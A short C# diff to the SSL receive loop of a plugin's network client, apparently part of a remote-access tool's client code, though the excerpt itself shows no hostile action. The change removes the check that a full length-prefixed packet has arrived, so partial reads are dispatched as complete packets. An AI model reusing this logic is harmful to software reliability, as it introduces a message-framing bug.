@@ -128,17 +128,13 @@ namespace Plugin
                                     IsConnected = false;
                                     return;
                                 }
-                                MS.Write(Buffer, 0, rc);
-                                Buffer = new byte[Buffersize - MS.Length];
+                                MS.Write(Buffer, 0, rc);                       
                             }
-                            if (MS.Length == Buffersize)
-                            {
-                                Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
-                                thread.Start(MS.ToArray());
-                                Buffer = new byte[4];
-                                MS.Dispose();
-                                MS = new MemoryStream();
-                            }
+                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
+                            thread.Start(MS.ToArray());
+                            Buffer = new byte[4];
+                            MS.Dispose();
+                            MS = new MemoryStream();
                         }
                     }
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
